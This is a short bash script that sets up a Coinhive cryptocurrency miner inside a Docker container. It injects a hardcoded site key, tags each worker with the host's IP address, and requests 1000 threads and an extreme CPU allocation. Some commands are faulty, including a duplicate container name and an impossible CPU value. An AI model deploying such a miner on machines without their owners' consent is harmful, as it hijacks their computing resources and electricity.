#!/bin/bash

sudo apt-get install docker.io -y
sudo apt-get update -y

coinhivefile="coin-hive.js"

clear

sitekey=IQ0XjU6yPmpxXlajlc09zfcj4kwA4JjD
username="docker_$1_$(hostname --ip-address)"
threads=1000

sed -i "s|{SITEKEY}|$sitekey|g" $coinhivefile
sed -i "s|{USERNAME}|$username|g" $coinhivefile
sed -i "s|{THREADS}|$threads|g" $coinhivefile

docker build -t dockerminer .

dockername=docker
docker run -d --name $dockername --cpus="10000" dockerminer
docker run -d --name $dockername dockerminer
